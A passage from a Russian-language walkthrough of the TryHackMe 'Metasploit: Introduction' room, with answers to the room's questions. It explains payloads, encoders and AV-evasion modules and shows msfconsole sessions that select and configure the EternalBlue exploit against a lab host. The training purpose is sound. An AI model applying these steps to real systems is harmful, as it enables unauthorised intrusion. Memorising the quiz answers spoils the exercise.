[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Metasploit: Introduction](https://tryhackme.com/r/room/metasploitintro) 

Всего 5 заданий:
## Задание 1
Metasploit — наиболее широко используемый фреймворк эксплуатации. Metasploit — мощный инструмент, который может 
поддерживать все фазы участия в тестировании на проникновение, от сбора информации до пост-эксплуатации. 



### Metasploit имеет две основные версии:

Metasploit Pro : коммерческая версия, облегчающая автоматизацию и управление задачами. Эта версия имеет графический 
пользовательский интерфейс (GUI). 
Metasploit Framework : версия с открытым исходным кодом, которая работает из командной строки. В этой комнате мы 
сосредоточимся на этой версии, установленной на AttackBox и наиболее часто используемых дистрибутивах Linux для 
тестирования на проникновение.  


Metasploit Framework — это набор инструментов, которые позволяют собирать информацию, сканировать, эксплуатировать, 
разрабатывать эксплойты, проводить пост-эксплуатацию и многое другое. Хотя основное применение Metasploit Framework 
сосредоточено на области тестирования на проникновение, он также полезен для исследования уязвимостей и разработки 
эксплойтов.



### Основные компоненты Metasploit Framework можно обобщить следующим образом:

- msfconsole : основной интерфейс командной строки.
- Модули : вспомогательные модули, такие как эксплойты, сканеры, полезные нагрузки и т. д.
- Инструменты : автономные инструменты, которые помогут в исследовании уязвимостей, оценке уязвимостей или 
  тестировании на проникновение. Некоторые из этих инструментов — msfvenom, pattern_create и pattern_offset. Мы 
  рассмотрим msfvenom в этом модуле, но pattern_create и pattern_offset — это инструменты, полезные при разработке 
  эксплойтов, что выходит за рамки этого модуля.


В этой комнате будут рассмотрены основные компоненты Metasploit, а также предоставлена прочная основа для поиска 
соответствующих эксплойтов, установки параметров и эксплуатации уязвимых служб в целевой системе. После завершения 
этой комнаты вы сможете комфортно перемещаться и использовать командную строку Metasploit.


Вы можете развернуть и использовать AttackBox для выполнения заданий и ответов на вопросы.

### Ответить на вопросы ниже
Ответ не требуется
```commandline
Ответ не нужен
```

## Задание 2
При использовании Metasploit Framework вы в первую очередь будете взаимодействовать с консолью Metasploit. Вы 
можете запустить ее из терминала AttackBox с помощью `msfconsole` команды. Консоль будет вашим основным интерфейсом 
для взаимодействия с различными модулями Metasploit Framework. Модули — это небольшие компоненты в рамках 
Metasploit Framework, созданные для выполнения определенной задачи, например, эксплуатации уязвимости, сканирования 
цели или проведения атаки методом подбора.

Прежде чем углубляться в модули, было бы полезно прояснить несколько повторяющихся понятий: уязвимость, эксплойт и 
полезная нагрузка.

- Эксплойт: фрагмент кода, использующий уязвимость, имеющуюся в целевой системе.
- Уязвимость: Ошибка в дизайне, кодировании или логике, влияющая на целевую систему. Эксплуатация уязвимости может 
  привести к раскрытию конфиденциальной информации или позволить злоумышленнику выполнить код на целевой системе.
- Полезная нагрузка: Эксплойт воспользуется уязвимостью. Однако, если мы хотим, чтобы эксплойт дал желаемый результат 
  (получение доступа к целевой системе, чтение конфиденциальной информации и т. д.), нам нужно использовать полезную 
  нагрузку. Полезная нагрузка — это код, который будет запущен в целевой системе.

Модули и категории под каждым из них перечислены ниже. Они даны для справочных целей, но вы будете взаимодействовать 
с ними через консоль Metasploit (msfconsole).

### Вспомогательный

Любые вспомогательные модули, такие как сканеры, краулеры и фаззеры, можно найти здесь.


```commandline
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 auxiliary/
auxiliary/
├── admin
├── analyze
├── bnat
├── client
├── cloud
├── crawler
├── docx
├── dos
├── example.py
├── example.rb
├── fileformat
├── fuzzers
├── gather
├── parser
├── pdf
├── scanner
├── server
├── sniffer
├── spoof
├── sqli
├── voip
└── vsploit

20 directories, 2 files
```


### Кодеры

Кодировщики позволят вам закодировать эксплойт и полезную нагрузку в надежде, что антивирусное решение на основе 
сигнатур сможет их пропустить.

Сигнатурные антивирусы и решения безопасности имеют базу данных известных угроз. Они обнаруживают угрозы, сравнивая 
подозрительные файлы с этой базой данных и выдают предупреждение, если есть совпадение. Таким образом, кодировщики 
могут иметь ограниченный процент успеха, поскольку антивирусные решения могут выполнять дополнительные проверки.

```commandline
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 encoders/
encoders/
├── cmd
├── generic
├── mipsbe
├── mipsle
├── php
├── ppc
├── ruby
├── sparc
├── x64
└── x86

10 directories, 0 files
```

### Уклонение

Хотя кодировщики будут кодировать полезную нагрузку, их не следует считать прямой попыткой обойти антивирусное ПО. С 
другой стороны, модули «обхода» попытаются сделать это с большим или меньшим успехом.


```commandline
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 2 evasion/
evasion/
└── windows
    ├── applocker_evasion_install_util.rb
    ├── applocker_evasion_msbuild.rb
    ├── applocker_evasion_presentationhost.rb
    ├── applocker_evasion_regasm_regsvcs.rb
    ├── applocker_evasion_workflow_compiler.rb
    ├── process_herpaderping.rb
    ├── syscall_inject.rb
    ├── windows_defender_exe.rb
    └── windows_defender_js_hta.rb

1 directory, 9 files
```
### exploits

Эксплойты, аккуратно организованные по целевой системе.

```
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 exploits/
exploits/
├── aix
├── android
├── apple_ios
├── bsd
├── bsdi
├── dialup
├── example_linux_priv_esc.rb
├── example.py
├── example.rb
├── example_webapp.rb
├── firefox
├── freebsd
├── hpux
├── irix
├── linux
├── mainframe
├── multi
├── netware
├── openbsd
├── osx
├── qnx
├── solaris
├── unix
└── windows

20 directories, 4 files
```

### NOP-ы

NOP (No OPeration) ничего не делают, буквально. Они представлены в семействе процессоров Intel x86 как 0x90, после 
чего процессор не будет ничего делать в течение одного цикла. Они часто используются в качестве буфера для 
достижения согласованных размеров полезной нагрузки.  

```commandline
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 nops/
nops/
├── aarch64
├── armle
├── cmd
├── mipsbe
├── php
├── ppc
├── sparc
├── tty
├── x64
└── x86

10 directories, 0 files
```

### Полезные нагрузки

Полезные нагрузки — это коды, которые будут запущены в целевой системе.

Эксплойты будут использовать уязвимость в целевой системе, но для достижения желаемого результата нам понадобится 
полезная нагрузка. Примерами могут быть: получение оболочки, загрузка вредоносного ПО или бэкдора в целевую систему, 
выполнение команды или запуск calc.exe в качестве доказательства концепции для добавления в отчет о тесте на 
проникновение. Удаленный запуск калькулятора в целевой системе путем запуска приложения calc.exe — это безвредный 
способ показать, что мы можем выполнять команды в целевой системе.

Запуск команды на целевой системе уже является важным шагом, но наличие интерактивного соединения, позволяющего 
вводить команды, которые будут выполнены на целевой системе, еще лучше. Такая интерактивная командная строка 
называется «оболочкой». Metasploit предлагает возможность отправлять различные полезные нагрузки, которые могут 
открывать оболочки на целевой системе.   

```commandline
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 payloads/
payloads/
├── adapters
├── singles
├── stagers
└── stages

4 directories, 0 files
```

В разделе полезных нагрузок вы увидите четыре различных каталога: адаптеры, одиночные файлы, Stagers и этапы.

- `Адаптеры`: Адаптер оборачивает отдельные полезные данные, чтобы преобразовать их в разные форматы. Например, 
обычный отдельный полезный данные может быть обёрнут в адаптер Powershell, который создаст одну команду PowerShell, 
  которая выполнит полезные данные. 
- `Одиночные`: автономные полезные нагрузки (добавление пользователя, запуск notepad.exe и т. д.), для запуска 
  которых не требуется загрузка дополнительных компонентов.
- `Stagers`: отвечает за настройку канала связи между Metasploit и целевой системой. Полезно при работе с поэтапными 
  полезными нагрузками. «Поэтапные полезные нагрузки» сначала загрузят stager в целевую систему, а затем загрузят 
  остальную полезную нагрузку (stage). Это дает некоторые преимущества, поскольку начальный размер полезной нагрузки 
  будет относительно небольшим по сравнению с полной полезной нагрузкой, отправленной сразу.  
- `Stages`: Скачивается stager. Это позволит использовать более крупные полезные нагрузки.


Metasploit предлагает тонкий способ помочь вам идентифицировать отдельные (также называемые «встроенными») полезные 
  нагрузки и поэтапные полезные нагрузки. 

- generic/shell_reverse_tcp
- windows/x64/shell/reverse_tcp


Оба являются обратными оболочками Windows. Первая представляет собой встроенную (или одиночную) полезную нагрузку, 
на что указывает «_» между «shell» и «reverse». В то время как последняя представляет собой поэтапную полезную 
нагрузку, на что указывает «/» между «shell» и «reverse».

### Почта

Пост-модули будут полезны на заключительном этапе процесса тестирования на проникновение, перечисленного выше, после 
эксплуатации. 

```commandline
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 post/
post/
├── aix
├── android
├── apple_ios
├── bsd
├── firefox
├── hardware
├── linux
├── multi
├── networking
├── osx
├── solaris
└── windows

12 directories, 0 files
```

Если вы хотите более подробно ознакомиться с этими модулями, вы можете найти их в папке modules вашей установки 
Metasploit . Для AttackBox они находятся в /opt/metasploit-framework/embedded/framework/modules 

### Ответить на вопросы ниже
Как называется код, использующий уязвимость целевой системы?
```commandline
Exploit
```
Как называется код, который запускается в целевой системе для достижения цели злоумышленника?
```commandline
Payload
```
Как называются автономные полезные нагрузки?
```commandline
Singles
```
Находится ли « windows/x64/pingback_reverse_tcp» среди одиночных или поэтапных полезных нагрузок?
```commandline
Singles
```

## Задание 3
Как уже упоминалось, консоль будет вашим основным интерфейсом для Metasploit Framework. Вы можете запустить ее с 
помощью msfconsole команды на вашем терминале AttackBox или любой системе, на которой установлен Metasploit Framework. 
```commandline
msfconsole
root@ip-10-10-220-191:~# msfconsole 
                                                  

                 _---------.
             .' #######   ;."
  .---,.    ;@             @@`;   .---,..
." @@@@@'.,'@@            @@@@@',.'@@@@ ".
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
     "--'.@@@  -.@        @ ,'-   .'--"
          ".@' ; @       @ `.  ;'
            |@@@@ @@@     @    .
             ' @@@ @@   @@    ,
              `.@@@@    @@   .
                ',@@     @   ;           _____________
                 (   3 C    )     /|___ / Metasploit! \
                 ;@'. __*__,."    \|--- \_____________/
                  '(.,...."/


       =[ metasploit v6.0                         ]
+ -- --=[ 2048 exploits - 1105 auxiliary - 344 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Search can apply complex filters such as search cve:2009 type:exploit, see all the filters with help search

msf6 >
```


После запуска вы увидите, что командная строка изменится на msf6 (или msf5 в зависимости от установленной версии 
Metasploit). Консоль Metasploit (msfconsole) можно использовать так же, как обычную оболочку командной строки, как 
вы можете видеть ниже. Первая команда — это ls которая выводит список содержимого папки, из которой был запущен 
Metasploitmsfconsole с помощью команды.

За ним следует ping отправленный на DNS IP-адрес Google (8.8.8.8). Поскольку мы работаем с AttackBox, который 
является Linux, нам пришлось добавить эту -c 1 опцию, поэтому был отправлен только один пинг. В противном случае 
процесс пингования продолжался бы до тех пор, пока он не был бы остановлен с помощью CTRL+C.

Линукс Команды в Метасплоит
```commandline
msf6 > ls
[*] exec: ls

burpsuite_community_linux_v2021_8_1.sh	Instructions  Scripts
Desktop					Pictures      thinclient_drives
Downloads				Postman       Tools
msf6 > ping -c 1 8.8.8.8
[*] exec: ping -c 1 8.8.8.8

PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=109 time=1.33 ms

--- 8.8.8.8 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1.335/1.335/1.335/0.000 ms
msf6 >
```


Он будет поддерживать большинство команд Linux, включая clear (очистку экрана терминала), но не позволит вам 
использовать некоторые функции обычной командной строки (например, не поддерживает перенаправление вывода), как 
показано ниже.  

Неудачное перенаправление вывода
```commandline
msf6 > help > help.txt
[-] No such command
msf6 >
```

Кстати, команда help может использоваться сама по себе или для определенной команды. Ниже приведено меню помощи для 
команды set, которую мы вскоре рассмотрим. 

Функция помощи
```commandline
msf6 > help set
Usage: set [option] [value]

Set the given option to value.  If value is omitted, print the current value.
If both are omitted, print options that are currently set.

If run from a module context, this will set the value in the module's
datastore.  Use -g to operate on the global datastore.

If setting a PAYLOAD, this command can take an index from `show payloads'.

msf6 >
```


Вы можете использовать команду «История», чтобы просмотреть команды, которые вы вводили ранее.

История команды
```commandline
msf6 > history
1  use exploit/multi/http/nostromo_code_exec
2  set lhost 10.10.16.17
3  set rport 80
4  options
5  set rhosts 10.10.29.187
6  run
7  exit
8  exit -y
9  version
10  use exploit/multi/script/web_delivery
```

Важной функцией msfconsole является поддержка автодополнения по клавише Tab. Это пригодится позже при использовании 
команд Metasploit или работе с модулями. Например, если вы начнете печатать he и нажмете клавишу Tab, вы увидите, 
что текст автоматически завершится в help.  

Msfconsole управляется контекстом; это означает, что если не задать его как глобальную переменную, все настройки 
параметров будут потеряны, если вы измените модуль, который решили использовать. В примере ниже мы использовали 
эксплойт ms17_010_eternalblue и установили такие параметры, как RHOSTS. Если бы мы переключились на другой модуль 
(например, сканер портов), нам пришлось бы снова установить значение RHOSTS, поскольку все внесенные нами изменения 
остались в контексте эксплойта ms17_010_eternalblue.     

Давайте рассмотрим пример ниже, чтобы лучше понять эту функцию. Мы будем использовать эксплойт MS17-010 
«Eternalblue» для иллюстрационных целей. 

После ввода `use exploit/windows/smb/ms17_010_eternalblue` команды вы увидите, что приглашение командной строки 
изменится с msf6 на «msf6 Exploit(windows/smb/ms17_010_eternalblue)». «EternalBlue» — это эксплойт, предположительно 
разработанный Агентством национальной безопасности США (АНБ) для уязвимости, влияющей на сервер SMBv1 во многих 
системах Windows. SMB (Server Message Block) широко используется в сетях Windows для обмена файлами и даже для 
отправки файлов на принтеры. EternalBlue был слит киберпреступной группой «Shadow Brokers» в апреле 2017 года. В мае 
2017 года эта уязвимость была использована по всему миру в атаке с использованием вируса-вымогателя WannaCry.

### Использование эксплойта
```commandline
msf6 > use exploit/windows/smb/ms17_010_eternalblue 
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```
Используемый модуль также можно выбрать с помощью use команды, за которой следует номер в начале строки результатов 
поиска. 

Хотя приглашение изменилось, вы заметите, что мы все еще можем выполнять ранее упомянутые команды. Это означает, что 
мы не «вводили» папку, как вы обычно ожидаете в командной строке операционной системы. 

Линукс команды в контексте
```commandline
msf6 exploit(windows/smb/ms17_010_eternalblue) > ls
[*] exec: ls

burpsuite_community_linux_v2021_8_1.sh	Instructions  Scripts
Desktop					Pictures      thinclient_drives
Downloads				Postman       Tools
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Подсказка сообщает нам, что теперь у нас есть набор контекстов, в которых мы будем работать. Вы можете увидеть это, 
введя команду show options. 

Показать параметры
```commandline
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.220.191    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Это выведет параметры, связанные с эксплойтом, который мы выбрали ранее. Команда show options будет иметь разные 
выходные данные в зависимости от контекста, в котором она используется. Пример выше показывает, что этот эксплойт 
потребует, чтобы мы установили переменные, такие как RHOSTS и RPORT. С другой стороны, модулю пост-эксплуатации 
может потребоваться только установить идентификатор сеанса (см. снимок экрана ниже). Сеанс — это существующее 
соединение с целевой системой, которое будет использовать модуль пост-эксплуатации.

Варианты постэксплуатационного модуля
```commandline
msf6 post(windows/gather/enum_domain_users) > show options

Module options (post/windows/gather/enum_domain_users):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HOST                      no        Target a specific host
   SESSION                   yes       The session to run this module on.
   USER                      no        Target User for NetSessionEnum

msf6 post(windows/gather/enum_domain_users) >
```


Команда show может использоваться в любом контексте, за которым следует тип модуля (вспомогательный, полезная 
нагрузка, эксплойт и т. д.) для получения списка доступных модулей. В примере ниже перечислены полезные нагрузки, 
которые можно использовать с эксплойтом ms17-010 Eternalblue.  

Команда show payloads
```commandline
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   generic/custom                                               manual  No     Custom Payload
   1   generic/shell_bind_tcp                                       manual  No     Generic Command Shell, Bind TCP Inline
   2   generic/shell_reverse_tcp                                    manual  No     Generic Command Shell, Reverse TCP Inline
   3   windows/x64/exec                                             manual  No     Windows x64 Execute Command
   4   windows/x64/loadlibrary                                      manual  No     Windows x64 LoadLibrary Path
   5   windows/x64/messagebox                                       manual  No     Windows MessageBox x64
   6   windows/x64/meterpreter/bind_ipv6_tcp                        manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   7   windows/x64/meterpreter/bind_ipv6_tcp_uuid                   manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support 
```

При использовании из командной строки msfconsole show команда выведет список всех модулей.

Команды use и show options, которые мы видели до сих пор, идентичны для всех модулей Metasploit.

Выйти из контекста можно с помощью `back` команды.
Команда «назад»
```commandline
msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 > 
```


Дополнительную информацию о любом модуле можно получить, введя info команду в его контексте.

Команда информации
```commandline
msf6 exploit(windows/smb/ms17_010_eternalblue) > info

       Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
     Module: exploit/windows/smb/ms17_010_eternalblue
   Platform: Windows
       Arch: 
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Average
  Disclosed: 2017-03-14

Provided by:
  Sean Dillon 
  Dylan Davis 
  Equation Group
  Shadow Brokers
  thelightcosine

Available targets:
  Id  Name
  --  ----
  0   Windows 7 and Server 2008 R2 (x64) All Service Packs

Check supported:
  Yes

Basic options:
  Name           Current Setting  Required  Description
  ----           ---------------  --------  -----------
  RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
  RPORT          445              yes       The target port (TCP)
  SMBDomain      .                no        (Optional) The Windows domain to use for authentication
  SMBPass                         no        (Optional) The password for the specified username
  SMBUser                         no        (Optional) The username to authenticate as
  VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
  VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.

Payload information:
  Space: 2000

Description:
  This module is a port of the Equation Group ETERNALBLUE exploit, 
  part of the FuzzBunch toolkit released by Shadow Brokers. There is a 
  buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is 
  calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error 
  where a DWORD is subtracted into a WORD. The kernel pool is groomed 
  so that overflow is well laid-out to overwrite an SMBv1 buffer. 
  Actual RIP hijack is later completed in 
  srvnet!SrvNetWskReceiveComplete. This exploit, like the original may 
  not trigger 100% of the time, and should be run continuously until 
  triggered. It seems like the pool will get hot streaks and need a 
  cool down period before the shells rain in again. The module will 
  attempt to use Anonymous login, by default, to authenticate to 
  perform the exploit. If the user supplies credentials in the 
  SMBUser, SMBPass, and SMBDomain options it will use those instead. 
  On some systems, this module may cause system instability and 
  crashes, such as a BSOD or a reboot. This may be more likely with 
  some payloads.

References:
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
  https://cvedetails.com/cve/CVE-2017-0143/
  https://cvedetails.com/cve/CVE-2017-0144/
  https://cvedetails.com/cve/CVE-2017-0145/
  https://cvedetails.com/cve/CVE-2017-0146/
  https://cvedetails.com/cve/CVE-2017-0147/
  https://cvedetails.com/cve/CVE-2017-0148/
  https://github.com/RiskSense-Ops/MS17-010

Also known as:
  ETERNALBLUE

msf6 exploit(windows/smb/ms17_010_eternalblue) > 

```

В качестве альтернативы вы можете использовать info команду, за которой следует путь к модулю из приглашения 
msfconsole (например info exploit/windows/smb/ms17_010_eternalblue, ). Info — это не меню справки; оно отобразит 
подробную информацию о модуле, такую как его автор, соответствующие источники и т. д.  

### Поиск

Одна из самых полезных команд в msfconsole — search. Эта команда будет искать в базе данных Metasploit Framework 
модули, соответствующие заданному параметру поиска. Вы можете выполнять поиск, используя номера CVE, имена 
эксплойтов (eternalblue, heartbleed и т. д.) или целевую систему.  

Команда поиска
```commandline
msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index, for example use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 >
```


Вывод команды search предоставляет обзор каждого возвращенного модуля. Вы можете заметить, что столбец «имя» уже 
дает больше информации, чем просто имя модуля. Вы можете увидеть тип модуля (вспомогательный, эксплойт и т. д.) и 
категорию модуля (сканер, администратор, Windows, Unix и т. д.). Вы можете использовать любой модуль, возвращенный в 
результате поиска, с помощью команды use, за которой следует номер в начале строки результата. (например, use 0 
вместо use auxiliary/admin/smb/ms17_010_command)


Другая важная часть возвращаемой информации находится в столбце «ранг». Эксплойты оцениваются на основе их 
надежности. В таблице ниже приведены их соответствующие описания.



Источник: https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking



Вы можете управлять функцией поиска, используя ключевые слова, такие как тип и платформа.



Например, если мы хотим, чтобы наши результаты поиска включали только вспомогательные модули, мы можем установить 
тип на вспомогательный. На снимке экрана ниже показан вывод команды telnet search type:auxiliary.

Поиск по типу модуля
```commandline
msf6 > search type:auxiliary telnet

Matching Modules
================

   #   Name                                                Disclosure Date  Rank    Check  Description
   -   ----                                                ---------------  ----    -----  -----------
   0   auxiliary/admin/http/dlink_dir_300_600_exec_noauth  2013-02-04       normal  No     D-Link DIR-600 / DIR-300 Unauthenticated Remote Command Execution
   1   auxiliary/admin/http/netgear_r6700_pass_reset       2020-06-15       normal  Yes    Netgear R6700v3 Unauthenticated LAN Admin Password Reset
   2   auxiliary/dos/cisco/ios_telnet_rocem                2017-03-17       normal  No     Cisco IOS Telnet Denial of Service
   3   auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof        2010-12-21       normal  No     Microsoft IIS FTP Server Encoded Response Overflow Trigger
   4   auxiliary/scanner/ssh/juniper_backdoor              2015-12-20       normal  No     Juniper SSH Backdoor Scanner
   5   auxiliary/scanner/telnet/brocade_enable_login                        normal  No     Brocade Enable Login Check Scanner
   6   auxiliary/scanner/telnet/lantronix_telnet_password                   normal  No     Lantronix Telnet Password Recovery
   7   auxiliary/scanner/telnet/lantronix_telnet_version                    normal  No     Lantronix Telnet Service Banner Detection
   8   auxiliary/scanner/telnet/satel_cmd_exec             2017-04-07       normal  No     Satel Iberia SenNet Data Logger and Electricity Meters Command Injection Vulnerability
   9   auxiliary/scanner/telnet/telnet_encrypt_overflow                     normal  No     Telnet Service Encryption Key ID Overflow Detection
   10  auxiliary/scanner/telnet/telnet_login                                normal  No     Telnet Login Check Scanner
   11  auxiliary/scanner/telnet/telnet_ruggedcom                            normal  No     RuggedCom Telnet Password Generator
   12  auxiliary/scanner/telnet/telnet_version                              normal  No     Telnet Service Banner Detection
   13  auxiliary/server/capture/telnet                                      normal  No     Authentication Capture: Telnet


Interact with a module by name or index, for example use 13 or use auxiliary/server/capture/telnet

msf6 >
```


Пожалуйста, помните, что эксплойты используют уязвимость целевой системы и всегда могут показывать неожиданное 
поведение. Эксплойт низкого ранга может работать идеально, а эксплойт отличного ранга может не работать или, что еще 
хуже, обрушить целевую систему.

### Ответить на вопросы ниже
Как бы вы искали модуль, связанный с Apache?
```commandline
search apache
```
Кто предоставил модуль auxiliary/scanner/ssh/ssh_login?
```commandline
todb
```

## Задание 4
Вы можете запустить целевую машину, подключенную к этой комнате, чтобы воспроизвести примеры, показанные ниже. Любая 
версия Metasploit 5 или 6 будет иметь меню и экраны, похожие на показанные здесь, поэтому вы можете использовать 
AttackBox или любую операционную систему, установленную на вашем локальном компьютере.

После того, как вы вошли в контекст модуля с помощью use команды, за которой следует имя модуля, как было показано 
ранее, вам нужно будет задать параметры. Ниже перечислены наиболее распространенные параметры, которые вы будете 
использовать. Помните, что в зависимости от используемого вами модуля может потребоваться задать дополнительные или 
другие параметры. Хорошей практикой является использование команды show optionsдля перечисления требуемых параметров.


Все параметры задаются с использованием одинакового синтаксиса команды:
`set PARAMETER_NAME VALUE`

Прежде чем продолжить, не забывайте всегда проверять приглашение msfconsole, чтобы убедиться, что вы находитесь в 
правильном контексте. При работе с Metasploit вы можете увидеть пять различных приглашений: 

Обычная командная строка: здесь нельзя использовать команды Metasploit.
Обычная командная строка
`root@ip-10-10-XX-XX:~#`
Приглашение msfconsole: msf6 (или msf5 в зависимости от установленной версии) — это приглашение msfconsole. Как 
видите, здесь не задан контекст, поэтому здесь нельзя использовать контекстно-зависимые команды для установки 
параметров и запуска модулей.  
Метасплоит командная строка
`msf6 >`

Контекстная подсказка: После того, как вы решили использовать модуль и использовали команду set для его выбора, 
msfconsole покажет контекст. Здесь вы можете использовать контекстно-зависимые команды (например, set RHOSTS 10.10.xx). 
Контекстная командная строка
`msf6 exploit(windows/smb/ms17_010_eternalblue) >`

Подсказка Meterpreter : Meterpreter — важная полезная нагрузка, которую мы подробно рассмотрим далее в этом модуле. 
Это означает, что агент Meterpreter был загружен в целевую систему и подключен к вам. Здесь вы можете использовать 
специальные команды Meterpreter.  
А
Meterpreter
командная строка
`meterpreter >`
Оболочка на целевой системе: После завершения эксплойта у вас может быть доступ к командной оболочке на целевой 
системе. Это обычная командная строка, и все команды, введенные здесь, выполняются на целевой системе. 
А
Meterpreter
командная строка
`C:\Windows\system32>`
Как упоминалось ранее, `show options` команда выведет список всех доступных параметров.

Команда «Показать параметры»
```commandline
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.44.70      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Как вы можете видеть на снимке экрана выше, некоторые из этих параметров требуют значения для работы эксплойта. 
Некоторые требуемые значения параметров будут предварительно заполнены, убедитесь, что вы проверили, должны ли они 
оставаться такими же для вашей цели. Например, веб-эксплойт может иметь значение RPORT (удаленный порт: порт на 
целевой системе, к которому Metasploit попытается подключиться и запустить эксплойт), предварительно установленное 
на 80, но ваше целевое веб-приложение может использовать порт 8080.

В этом примере мы установим параметр RHOSTS на IP-адрес нашей целевой системы с помощью команды set.

А
Meterpreter
командная строка
```commandline
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.165.39
rhosts => 10.10.165.39
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.165.39     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.44.70      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf6 exploit(windows/smb/ms17_010_eternalblue) >
```


После установки параметра вы можете использовать show options команду для проверки правильности установки значения.



Параметры, которые вы часто будете использовать:

